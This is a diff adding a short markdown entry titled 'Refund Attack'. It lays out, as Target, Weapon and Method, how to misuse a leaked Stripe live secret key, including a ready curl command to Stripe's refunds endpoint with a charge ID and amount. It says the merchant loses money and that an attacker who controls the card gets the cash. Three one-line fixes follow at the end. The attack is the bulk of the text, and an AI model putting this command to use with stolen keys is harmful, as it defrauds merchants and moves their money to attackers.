@@ -1,0 +1,22 @@
+1. 🩸 Refund Attack
+Target: Real charge_id from a site
+Weapon: Leaked sk_live_
+Method:
+
+
+curl https://api.stripe.com/v1/refunds \
+  -u sk_live_xxx: \
+  -d charge=ch_12345 \
+  -d amount=9999 \
+  -d reason=requested_by_customer
+
+
+💀 Merchant loses money. If card is controlled → attacker gets cash.
+
+🛡️ Fix:
+
+Disable API-based refunds
+
+Monitor refund volume
+
+Require manual review
